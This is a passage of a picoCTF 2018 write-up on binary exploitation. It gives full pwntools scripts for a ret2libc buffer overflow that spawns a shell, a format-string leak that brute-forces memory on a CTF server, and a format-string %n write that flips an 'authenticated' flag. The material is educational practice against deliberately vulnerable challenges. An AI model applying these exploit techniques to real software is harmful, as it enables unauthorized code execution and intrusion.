vuln <span style=color:#ff79c6>=</span> pwn<span style=color:#ff79c6>.</span>ELF(<span style=color:#f1fa8c>&#39;./vuln&#39;</span>)
p <span style=color:#ff79c6>=</span> vuln<span style=color:#ff79c6>.</span>process()
prompt <span style=color:#ff79c6>=</span> p<span style=color:#ff79c6>.</span>recv()
puts_addr <span style=color:#ff79c6>=</span> <span style=color:#8be9fd;font-style:italic>int</span>(re<span style=color:#ff79c6>.</span>findall(<span style=color:#f1fa8c>&#39;puts: (.*)&#39;</span>, prompt)[<span style=color:#bd93f9>0</span>],<span style=color:#bd93f9>16</span>)

<span style=color:#6272a4>#libc_base address</span>
libc <span style=color:#ff79c6>=</span> pwn<span style=color:#ff79c6>.</span>ELF(<span style=color:#f1fa8c>&#34;/lib32/libc.so.6&#34;</span>)
libc_base <span style=color:#ff79c6>=</span> puts_addr <span style=color:#ff79c6>-</span> libc<span style=color:#ff79c6>.</span>symbols[<span style=color:#f1fa8c>&#34;puts&#34;</span>]

<span style=color:#6272a4>#Rebase libc</span>
libc<span style=color:#ff79c6>.</span>address <span style=color:#ff79c6>=</span> libc_base

<span style=color:#6272a4># system address in libc</span>
<span style=color:#6272a4>#Not needed since libc was rebased: system_offset = libc[&#34;system&#34;]      # print(hex(libc[&#34;system&#34;])     # &#39;0x3cd10&#39;</span>
<span style=color:#6272a4>#Not needed since libc was rebased: system_addr = p32(libc_base + system_offset)</span>
system_addr <span style=color:#ff79c6>=</span> libc<span style=color:#ff79c6>.</span>symbols[<span style=color:#f1fa8c>&#34;system&#34;</span>]
</code></pre></td></tr></table>
</div>
</div><h3 id=buffer-overflow-exploitation>Buffer overflow exploitation</h3>
<h4 id=stack-layout-of-the-vuln-function-before-the-overflow>Stack Layout of the vuln function before the overflow:</h4>
<pre><code>+----------+
| ????     | &lt;-- ebp + 0xc &lt;-- We want to override with arguments to be passed to system()
| ????     | &lt;-- ebp + 0x8
+----------+
| ret      | &lt;-- ebp + 0x4 &lt;-- We want to override with the system() function address
| old ebp  | &lt;-- ebp
+----------+
| buf[148] | &lt;-- ebp - 148
|          |
+----------+
</code></pre>
<p>When the <code>vuln</code> function returns, it pops ebp and returns to (ebp + 0x4). So it would be good to override (ebp+4) with the address of the system function <code>system</code>.</p>
<h4 id=stack-layout-after-overflow>Stack Layout after overflow:</h4>
<pre><code>+----------+
| &amp;bin_sh  | &lt;-- ebp + 0xc  &lt;-- arguments for system call is the address of string &quot;/bin/sh&quot;
| JUNK     | &lt;-- ebp + 0x8  &lt;-- fake ret address
+----------+
| &amp;system  | &lt;-- ebp + 0x4  &lt;-- system_address
| AAA..AA  | &lt;-- ebp        &lt;-- 'A'*4
+----------+
| AAA..AA] | &lt;-- ebp - 148  &lt;-- 'A'*(148)
| AAA..AAA |
+----------+
</code></pre>
<h4 id=stack-after-vuln-function-returns>Stack after vuln function returns</h4>
<p>The stack after system call prolog (push ebp, mov ebp, esp) is:</p>
<pre><code>+----------+
| &amp;bin_sh  | &lt;-- ebp + 0x8  &lt;-- arguments for system call
| JUNK     | &lt;-- ebp + 0x4  &lt;-- fake ret address
+----------+
| old ebp  | &lt;-- ebp
+----------+
</code></pre>
<p>Which means that <code>system</code> will treat the address of &ldquo;/bin/sh&rdquo; as its argument, and give us a shell.## Exploit</p>
<h3 id=exploitation>Exploitation</h3>
<div class=highlight><div style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">18
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">19
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">20
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">21
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">22
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">23
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">24
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">25
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">26
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">27
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">28
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">29
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">30
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">31
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">32
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">33
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">34
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">35
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">36
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">37
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">38
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">39
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">40
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">41
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">42
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">43
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">44
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">45
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">46
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">47
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">48
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">49
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">50
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">51
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">52
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">53
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">54
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">55
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">56
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">57
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">58
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">59
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">60
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">61
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">62
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">63
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">64
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">65
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">66
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">67
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">68
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">69
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">70
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">71
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">72
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">73
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">74
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">75
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">76
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">77
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">78
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">79
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">80
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">81
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">82
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">83
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">84
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">85
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">86
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">87
</span></code></pre></td>
<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#6272a4>#!/bin/usr/env python</span>
<span style=color:#ff79c6>from</span> pwn <span style=color:#ff79c6>import</span> ELF, ssh, p32, cyclic, cyclic_find, ROP, fit, log
<span style=color:#ff79c6>import</span> re
<span style=color:#ff79c6>import</span> os

DEV<span style=color:#ff79c6>=</span><span style=color:#bd93f9>1</span>

SSH_SERVER <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#34;2018shell4.picoctf.com&#34;</span>
LOCAL_PATH <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#39;.&#39;</span>
REMOTE_PATH <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#39;/problems/got-2-learn-libc_0_4c2b153da9980f0b2d12a128ff19dc3f&#39;</span>
ssh_user<span style=color:#ff79c6>=</span><span style=color:#f1fa8c>&#39;0xade1&#39;</span>

<span style=color:#ff79c6>def</span> <span style=color:#50fa7b>get_process_local</span>():
    elf <span style=color:#ff79c6>=</span> ELF(LOCAL_PATH <span style=color:#ff79c6>+</span> <span style=color:#f1fa8c>&#39;/vuln&#39;</span>)
    p <span style=color:#ff79c6>=</span> elf<span style=color:#ff79c6>.</span>process()
    libc <span style=color:#ff79c6>=</span> ELF(<span style=color:#f1fa8c>&#34;/lib/i386-linux-gnu/libc.so.6&#34;</span>)
    <span style=color:#ff79c6>return</span> p, libc

<span style=color:#ff79c6>def</span> <span style=color:#50fa7b>get_process_remote</span>():
    path <span style=color:#ff79c6>=</span> REMOTE_PATH <span style=color:#ff79c6>+</span> <span style=color:#f1fa8c>&#39;/vuln&#39;</span>
    params <span style=color:#ff79c6>=</span> {<span style=color:#f1fa8c>&#34;argv&#34;</span>: path, <span style=color:#f1fa8c>&#34;cwd&#34;</span>: os<span style=color:#ff79c6>.</span>path<span style=color:#ff79c6>.</span>dirname(path)}
    s <span style=color:#ff79c6>=</span> ssh(host<span style=color:#ff79c6>=</span>SSH_SERVER, user<span style=color:#ff79c6>=</span>ssh_user)
    p <span style=color:#ff79c6>=</span> s<span style=color:#ff79c6>.</span>process(<span style=color:#ff79c6>**</span>params)
    libc <span style=color:#ff79c6>=</span> ELF(<span style=color:#f1fa8c>&#34;./libc-2.23.so&#34;</span>)
    <span style=color:#ff79c6>return</span> p, libc

<span style=color:#ff79c6>def</span> <span style=color:#50fa7b>get_overflow_offset</span>():
    <span style=color:#6272a4># When filesystem is NTFS, it&#39;s problematic to create a core dump,</span>
    <span style=color:#6272a4># Therefore we have to reconfigure core dumps to be created elsewhere</span>
    <span style=color:#6272a4>#os.system(&#34;echo /dev/shm/.core/core_dump &gt; /proc/sys/kernel/core_pattern&#34;)</span>
    <span style=color:#6272a4>#os.system(&#34;echo ~/core/core_dump &gt; /proc/sys/kernel/core_pattern&#34;)</span>
    proc, _ <span style=color:#ff79c6>=</span> get_process_local()
    payload <span style=color:#ff79c6>=</span> cyclic(<span style=color:#bd93f9>200</span>)
    proc<span style=color:#ff79c6>.</span>sendlineafter(<span style=color:#f1fa8c>&#34;Enter a string:&#34;</span>, payload)
    proc<span style=color:#ff79c6>.</span>wait()
    core <span style=color:#ff79c6>=</span> proc<span style=color:#ff79c6>.</span>corefile
    offset <span style=color:#ff79c6>=</span> cyclic_find(core<span style=color:#ff79c6>.</span>eip)
    log<span style=color:#ff79c6>.</span>info(<span style=color:#f1fa8c>&#34;Overflow offset: </span><span style=color:#f1fa8c>{}</span><span style=color:#f1fa8c>&#34;</span><span style=color:#ff79c6>.</span>format(offset))
    <span style=color:#ff79c6>return</span> offset

<span style=color:#6272a4>#offset = 160</span>
offset <span style=color:#ff79c6>=</span> get_overflow_offset()

<span style=color:#ff79c6>if</span> (DEV):
    p, libc <span style=color:#ff79c6>=</span> get_process_local()
<span style=color:#ff79c6>else</span>:
    p, libc <span style=color:#ff79c6>=</span> get_process_remote()

prompt <span style=color:#ff79c6>=</span> p<span style=color:#ff79c6>.</span>recvuntil(<span style=color:#f1fa8c>&#34;Enter a string:&#34;</span>)
puts_addr <span style=color:#ff79c6>=</span> <span style=color:#8be9fd;font-style:italic>int</span>(re<span style=color:#ff79c6>.</span>findall(<span style=color:#f1fa8c>&#39;puts: (.*)&#39;</span>, prompt<span style=color:#ff79c6>.</span>decode())[<span style=color:#bd93f9>0</span>],<span style=color:#bd93f9>16</span>)
bin_sh_addr <span style=color:#ff79c6>=</span> <span style=color:#8be9fd;font-style:italic>int</span>(re<span style=color:#ff79c6>.</span>findall(<span style=color:#f1fa8c>&#39;useful_string: (.*)&#39;</span>, prompt<span style=color:#ff79c6>.</span>decode())[<span style=color:#bd93f9>0</span>],<span style=color:#bd93f9>16</span>)

<span style=color:#6272a4>#libc_base address</span>
libc_base <span style=color:#ff79c6>=</span> puts_addr <span style=color:#ff79c6>-</span> libc<span style=color:#ff79c6>.</span>symbols[<span style=color:#f1fa8c>&#34;puts&#34;</span>]

<span style=color:#6272a4>#Rebase libc</span>
libc<span style=color:#ff79c6>.</span>address <span style=color:#ff79c6>=</span> libc_base

<span style=color:#6272a4>#system runtime address</span>
system_addr <span style=color:#ff79c6>=</span> libc<span style=color:#ff79c6>.</span>symbols[<span style=color:#f1fa8c>&#34;system&#34;</span>]

log<span style=color:#ff79c6>.</span>info(<span style=color:#f1fa8c>&#34;Address of /bin/sh: </span><span style=color:#f1fa8c>{}</span><span style=color:#f1fa8c>&#34;</span><span style=color:#ff79c6>.</span>format(<span style=color:#8be9fd;font-style:italic>hex</span>(bin_sh_addr)))
log<span style=color:#ff79c6>.</span>info(<span style=color:#f1fa8c>&#34;Address of puts: </span><span style=color:#f1fa8c>{}</span><span style=color:#f1fa8c>&#34;</span><span style=color:#ff79c6>.</span>format(<span style=color:#8be9fd;font-style:italic>hex</span>(puts_addr)))
log<span style=color:#ff79c6>.</span>info(<span style=color:#f1fa8c>&#34;Address of libc_base: </span><span style=color:#f1fa8c>{}</span><span style=color:#f1fa8c>&#34;</span><span style=color:#ff79c6>.</span>format(<span style=color:#8be9fd;font-style:italic>hex</span>(libc_base)))
log<span style=color:#ff79c6>.</span>info(<span style=color:#f1fa8c>&#34;Address of system: </span><span style=color:#f1fa8c>{}</span><span style=color:#f1fa8c>&#34;</span><span style=color:#ff79c6>.</span>format(<span style=color:#8be9fd;font-style:italic>hex</span>(system_addr)))

<span style=color:#ff79c6>def</span> <span style=color:#50fa7b>payload</span>():
    payload <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>b</span><span style=color:#f1fa8c>&#39;A&#39;</span><span style=color:#ff79c6>*</span>offset
    payload <span style=color:#ff79c6>+=</span> p32(system_addr)
    payload <span style=color:#ff79c6>+=</span> <span style=color:#f1fa8c>b</span><span style=color:#f1fa8c>&#39;JUNK&#39;</span>
    payload <span style=color:#ff79c6>+=</span> p32(bin_sh_addr)
    log<span style=color:#ff79c6>.</span>info(<span style=color:#f1fa8c>f</span><span style=color:#f1fa8c>&#34;Payload: </span><span style=color:#f1fa8c>{</span>payload<span style=color:#f1fa8c>}</span><span style=color:#f1fa8c>&#34;</span>)
    <span style=color:#ff79c6>return</span> payload

<span style=color:#ff79c6>def</span> <span style=color:#50fa7b>payload2</span>():
    r <span style=color:#ff79c6>=</span> ROP(libc)
    r<span style=color:#ff79c6>.</span>system(bin_sh_addr)
    payload <span style=color:#ff79c6>=</span> fit({offset: <span style=color:#f1fa8c>&#34;&#34;</span>})
    payload <span style=color:#ff79c6>+=</span> r<span style=color:#ff79c6>.</span>chain()
    log<span style=color:#ff79c6>.</span>info(<span style=color:#f1fa8c>f</span><span style=color:#f1fa8c>&#34;Payload: </span><span style=color:#f1fa8c>{</span>payload<span style=color:#f1fa8c>}</span><span style=color:#f1fa8c>&#34;</span>)
    log<span style=color:#ff79c6>.</span>info(<span style=color:#f1fa8c>&#34;ROP dump:&#34;</span>)
    <span style=color:#8be9fd;font-style:italic>print</span> (r<span style=color:#ff79c6>.</span>dump())
    <span style=color:#ff79c6>return</span> payload

p<span style=color:#ff79c6>.</span>sendline(payload2())
p<span style=color:#ff79c6>.</span>sendline(<span style=color:#f1fa8c>&#39;cat flag.txt&#39;</span>)
p<span style=color:#ff79c6>.</span>interactive()
</code></pre></td></tr></table>
</div>
</div><h2 id=echooo>echooo</h2>
<p>The binary will execute any given <a href=https://owasp.org/www-community/attacks/Format_string_attack>format-string</a>.</p>
<div class=highlight><div style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">4
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">5
</span></code></pre></td>
<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c>  <span style=color:#ff79c6>while</span>(<span style=color:#bd93f9>1</span>) {
    printf(<span style=color:#f1fa8c>&#34;&gt; &#34;</span>);
    fgets(buf, <span style=color:#ff79c6>sizeof</span>(buf), stdin);
    printf(buf); 			<span style=color:#6272a4>//Format-String vulnerability
</span><span style=color:#6272a4></span>  }
</code></pre></td></tr></table>
</div>
</div><p>Therefore, we can bruteforce the memory and read it until we find the flag buffer</p>
<div class=highlight><div style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
</span></code></pre></td>
<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#6272a4>#!/usr/bin/env python</span>

<span style=color:#ff79c6>import</span> pwn
pwn<span style=color:#ff79c6>.</span>context<span style=color:#ff79c6>.</span>log_level <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#39;critical&#39;</span>

host, port <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#39;2018shell.picoctf.com&#39;</span>, <span style=color:#bd93f9>34802</span>

<span style=color:#ff79c6>for</span> i <span style=color:#ff79c6>in</span> <span style=color:#8be9fd;font-style:italic>range</span>(<span style=color:#bd93f9>100</span>):
  s <span style=color:#ff79c6>=</span> pwn<span style=color:#ff79c6>.</span>remote(host, port)
  prompt <span style=color:#ff79c6>=</span> s<span style=color:#ff79c6>.</span>recvuntil(<span style=color:#f1fa8c>&#39;&gt; &#39;</span>)
  s<span style=color:#ff79c6>.</span>sendline(<span style=color:#f1fa8c>&#39;%&#39;</span><span style=color:#ff79c6>+</span><span style=color:#8be9fd;font-style:italic>str</span>(i)<span style=color:#ff79c6>+</span><span style=color:#f1fa8c>&#39;$s&#39;</span>)
  prompt <span style=color:#ff79c6>=</span> s<span style=color:#ff79c6>.</span>recv()
  <span style=color:#8be9fd;font-style:italic>print</span>(prompt)
  s<span style=color:#ff79c6>.</span>close()
  <span style=color:#ff79c6>if</span> <span style=color:#f1fa8c>b</span><span style=color:#f1fa8c>&#39;pico&#39;</span> <span style=color:#ff79c6>in</span> prompt:
      <span style=color:#ff79c6>break</span>

</code></pre></td></tr></table>
</div>
</div><h2 id=authenticate>authenticate</h2>
<ul>
<li>source: <a href=./resources/authenticate/auth.c>auth.c</a></li>
<li>binary: <a href=./resources/authenticate/auth>auth</a></li>
</ul>
<p>Another <a href=https://owasp.org/www-community/attacks/Format_string_attack>format-string</a> when buf does not contains &lsquo;yes&rsquo; or &lsquo;no&rsquo;</p>
<div class=highlight><div style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span></code></pre></td>
<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c>  fgets(buf, <span style=color:#ff79c6>sizeof</span>(buf), stdin);

  <span style=color:#ff79c6>if</span> (strstr(buf, <span style=color:#f1fa8c>&#34;no&#34;</span>) <span style=color:#ff79c6>!=</span> <span style=color:#8be9fd;font-style:italic>NULL</span>) {
    printf(<span style=color:#f1fa8c>&#34;Okay, Exiting...</span><span style=color:#f1fa8c>\n</span><span style=color:#f1fa8c>&#34;</span>);
    exit(<span style=color:#bd93f9>1</span>);
  }
  <span style=color:#ff79c6>else</span> <span style=color:#ff79c6>if</span> (strstr(buf, <span style=color:#f1fa8c>&#34;yes&#34;</span>) <span style=color:#ff79c6>==</span> <span style=color:#8be9fd;font-style:italic>NULL</span>) {
    puts(<span style=color:#f1fa8c>&#34;Received Unknown Input:</span><span style=color:#f1fa8c>\n</span><span style=color:#f1fa8c>&#34;</span>);
    printf(buf);			<span style=color:#6272a4>/* format-string vulnerability */</span>
  }
</code></pre></td></tr></table>
</div>
</div><p>The flag will be printed if we can override the local variable &lsquo;authenticated&rsquo; to be &lt;> 0</p>
<div class=highlight><div style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
</span></code></pre></td>
<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=color:#8be9fd>int</span> authenticated <span style=color:#ff79c6>=</span> <span style=color:#bd93f9>0</span>;
[...]
<span style=color:#8be9fd>void</span> read_flag() {
  <span style=color:#ff79c6>if</span> (<span style=color:#ff79c6>!</span>authenticated) {
    printf(<span style=color:#f1fa8c>&#34;Sorry, you are not *authenticated*!</span><span style=color:#f1fa8c>\n</span><span style=color:#f1fa8c>&#34;</span>);
  }
  <span style=color:#ff79c6>else</span> {
    printf(<span style=color:#f1fa8c>&#34;Access Granted.</span><span style=color:#f1fa8c>\n</span><span style=color:#f1fa8c>&#34;</span>);
    flag();
  }
}
</code></pre></td></tr></table>
</div>
</div><p>It is possible to use a format-string to write any address at an arbitrary location.
A great resources to demonstrate is <a href=http://codearcana.com/posts/2013/05/02/introduction-to-format-string-exploits.html>codearcana</a></p>
<p>Our exploitation path is the below:</p>
<ol>
<li>To achieve this, we find the address of the authenticated global (0x804a04c) with objdump or <code>pwn.symbols['authenticated']</code></li>
<li>We craft a format-string payload that contains the address 0x804a04c with a large sequence of &lsquo;%p&rsquo;</li>
<li>We pass this format-string as an argument to the vulnerable printf function, therefore our format string is in the stack frame of printf</li>
</ol>
<ul>
<li>The format-string is in the stackframe of printf and looks like: <code>payload = pwn.p32(elf.symbols['authenticated']) + '%p'*50</code></li>
<li>%p is an external representation of a pointer to void (in other words, it&rsquo;s a 32bits address)</li>
</ul>
<ol start=4>
<li>Executed, the format-string will dump the stackframe content &mldr;</li>
</ol>
<ul>
<li>Therefore we should find the relative position on the stackframe of the address 0x804a04c</li>
<li>We find the address is at position 11</li>
<li>Another representation to simplify the payload is: <code>payload = pwn.p32(elf.symbols['authenticated']) + '%11$p'</code></li>
</ul>
<ol start=5>
<li>We can now leverage another format-string to write a number at 0x804a04c (the address of the &lsquo;authenticated&rsquo; global)</li>
</ol>
<ul>
<li>Instead of %11$p (print the 11th dword on the stack), we can use %n11$p</li>
<li>%11$n writes the number of printed characters at the address pointed 11 dwords further in the stack</li>
<li><code>payload = pwn.p32(elf.symbols['authenticated']) + '%11$n'</code> : indeed, &lsquo;n&rsquo; will write the number of char written by printf which is 4 because of pwn.p32(&mldr;) size.</li>
</ul>
<div class=highlight><div style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
